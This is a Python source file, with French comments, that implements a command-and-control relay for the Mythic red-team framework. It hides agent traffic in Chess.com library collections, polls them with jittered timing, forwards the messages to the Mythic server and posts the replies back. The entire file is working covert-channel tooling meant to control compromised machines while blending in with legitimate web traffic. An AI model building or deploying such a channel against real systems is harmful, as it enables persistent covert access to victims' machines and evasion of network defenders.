#!/usr/bin/env python3
"""
Profil C2 Chess.com pour Mythic — écoute les collections bibliothèque (PGN/FEN),
décodage compatible CheckmateC2, relais vers Mythic.
"""

from __future__ import annotations

import asyncio
import json
import logging
import os
import random
import sys
from pathlib import Path

import httpx

from chesscom_client import DEFAULT_SKIP_IDS, ChessComClient

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    stream=sys.stdout,
)
logger = logging.getLogger("chesscom-c2-server")

MYTHIC_SERVER_HOST = os.environ.get("MYTHIC_SERVER_HOST", "mythic_server")
MYTHIC_SERVER_PORT = int(os.environ.get("MYTHIC_SERVER_PORT", "17443"))
MYTHIC_AGENT_URL = f"http://{MYTHIC_SERVER_HOST}:{MYTHIC_SERVER_PORT}/agent_message"


def load_config() -> dict:
    here = Path(__file__).parent
    config_path = here / "config.json"
    if config_path.exists():
        with open(config_path) as f:
            data = json.load(f)
        if "instances" in data and isinstance(data["instances"], list) and data["instances"]:
            data = data["instances"][0]
        logger.info("Config chargée depuis config.json")
        return data

    logger.warning("config.json absent — variables d'environnement uniquement")
    return {
        "chess_com_cookie": os.environ.get("CHESS_COM_COOKIE", ""),
        "upload_token": os.environ.get("CHESS_UPLOAD_TOKEN", ""),
        "clear_token": os.environ.get("CHESS_CLEAR_TOKEN", ""),
        "agent_to_server_collection": os.environ.get("AGENT_TO_SERVER_COLLECTION", ""),
        "server_to_agent_collection": os.environ.get("SERVER_TO_AGENT_COLLECTION", ""),
        "callback_interval": int(os.environ.get("CALLBACK_INTERVAL", "10")),
        "callback_jitter": int(os.environ.get("CALLBACK_JITTER", "10")),
        "skip_item_ids": os.environ.get("SKIP_ITEM_IDS", ""),
    }


async def forward_to_mythic(data: bytes) -> bytes:
    async with httpx.AsyncClient() as client:
        resp = await client.post(
            MYTHIC_AGENT_URL,
            content=data,
            headers={
                "Content-Type": "application/octet-stream",
                "mythic": "chesscom",
            },
            timeout=60.0,
        )
        resp.raise_for_status()
        return resp.content


def compute_sleep(interval: int, jitter: int) -> float:
    if jitter <= 0:
        return float(interval)
    delta = interval * (jitter / 100.0)
    return max(1.0, interval + random.uniform(-delta, delta))


def parse_skip_ids(s: str) -> frozenset[str]:
    if not s or not str(s).strip():
        return frozenset()
    parts = [p.strip().lower() for p in str(s).split(",") if p.strip()]
    return frozenset(parts)


async def poll_loop(client: ChessComClient, interval: int, jitter: int) -> None:
    logger.info(
        "Boucle poll démarrée (interval=%ss jitter=%s%% mythic=%s)",
        interval,
        jitter,
        MYTHIC_AGENT_URL,
    )
    while True:
        try:
            raw = await client.wait_download_payload(client.inbound_id)
            if not raw:
                await asyncio.sleep(3.0)
                continue

            logger.info("Message agent reçu (%s octets bruts)", len(raw))
            # Vide l'outbound immédiatement : l'agent ne doit pas lire une réponse périmée
            try:
                await client.clear_collection(client.outbound_id)
            except Exception as e:
                logger.warning("clear outbound avant réponse: %s", e)
            response = await forward_to_mythic(raw)
            logger.info("Réponse Mythic (%s octets)", len(response))

            await client.upload_payload(client.outbound_id, response)
            try:
                await client.clear_collection(client.inbound_id)
            except Exception as e:
                logger.warning(
                    "Impossible de vider la collection entrante (doublons possibles): %s",
                    e,
                )

        except Exception as e:
            logger.error("Erreur dans la boucle poll: %s", e, exc_info=True)

        await asyncio.sleep(compute_sleep(interval, jitter))


async def main() -> None:
    config = load_config()

    cookie = config.get("chess_com_cookie", "")
    upload_token = config.get("upload_token", "")
    clear_token = config.get("clear_token", "")
    inbound = config.get("agent_to_server_collection", "")
    outbound = config.get("server_to_agent_collection", "")
    interval = int(config.get("callback_interval", 10))
    jitter = int(config.get("callback_jitter", 10))
    extra_skip = parse_skip_ids(config.get("skip_item_ids", ""))
    library_referer = str(config.get("library_referer", "") or "").strip()

    for name, val in [
        ("chess_com_cookie", cookie),
        ("upload_token", upload_token),
        ("clear_token", clear_token),
        ("agent_to_server_collection", inbound),
        ("server_to_agent_collection", outbound),
    ]:
        if not val:
            logger.error("Paramètre requis manquant: %s", name)
            sys.exit(1)

    skip = frozenset(DEFAULT_SKIP_IDS | extra_skip)

    client = ChessComClient(
        cookie=cookie,
        upload_token=upload_token,
        clear_token=clear_token,
        agent_to_server_collection=inbound,
        server_to_agent_collection=outbound,
        skip_item_ids=skip,
        library_referer=library_referer,
    )
    await poll_loop(client, interval, jitter)


if __name__ == "__main__":
    asyncio.run(main())
